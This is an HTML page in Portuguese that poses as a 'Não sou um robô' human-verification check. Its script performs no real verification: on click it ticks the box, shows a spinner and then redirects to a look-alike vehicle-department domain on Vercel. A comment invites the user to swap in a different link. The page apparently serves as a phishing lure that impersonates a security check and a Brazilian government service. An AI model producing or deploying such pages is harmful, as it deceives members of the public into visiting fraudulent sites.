<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Verificação Humana</title>

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:Arial,sans-serif;
}

body{
  background:#f3f4f6;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}

.box{
  width:360px;
  background:white;
  border-radius:16px;
  padding:30px;
  box-shadow:0 8px 25px rgba(0,0,0,0.12);
}

.title{
  font-size:22px;
  font-weight:bold;
  margin-bottom:10px;
  color:#111827;
}

.subtitle{
  color:#6b7280;
  font-size:14px;
  margin-bottom:25px;
}

.verify-area{
  border:2px solid #d1d5db;
  border-radius:12px;
  padding:18px;
  display:flex;
  align-items:center;
  cursor:pointer;
  transition:0.3s;
}

.verify-area:hover{
  border-color:#3b82f6;
}

.checkbox{
  width:28px;
  height:28px;
  border:2px solid #9ca3af;
  border-radius:6px;
  margin-right:15px;
  display:flex;
  justify-content:center;
  align-items:center;
  font-size:18px;
  color:white;
  transition:0.3s;
}

.label{
  font-size:16px;
  color:#111827;
}

.footer{
  margin-top:18px;
  text-align:center;
  font-size:12px;
  color:#9ca3af;
}

.loading{
  display:none;
  margin-top:20px;
  text-align:center;
  color:#3b82f6;
  font-size:14px;
}

.spinner{
  width:22px;
  height:22px;
  border:3px solid #dbeafe;
  border-top:3px solid #2563eb;
  border-radius:50%;
  margin:0 auto 10px;
  animation:spin 1s linear infinite;
}

@keyframes spin{
  100%{
    transform:rotate(360deg);
  }
}

.success{
  background:#22c55e;
  border-color:#22c55e;
}
</style>
</head>
<body>

<div class="box">

  <div class="title">
    Verificação necessária
  </div>

  <div class="subtitle">
    Confirme que você é humano para continuar.
  </div>

  <div class="verify-area" onclick="startVerification()">

    <div class="checkbox" id="checkbox"></div>

    <div class="label">
      Não sou um robô
    </div>

  </div>

  <div class="loading" id="loading">
    <div class="spinner"></div>
    Verificando...
  </div>

  <div class="footer">
    Sistema de proteção automatizada
  </div>

</div>

<script>
function startVerification(){

  const checkbox = document.getElementById("checkbox");
  const loading = document.getElementById("loading");

  checkbox.innerHTML = "✓";
  checkbox.classList.add("success");

  loading.style.display = "block";

  setTimeout(() => {

    // ALTERE O LINK AQUI
    window.location.href = "https://departamento-veicular-esbr.vercel.app";

  }, 2500);
}
</script>

</body>
</html>
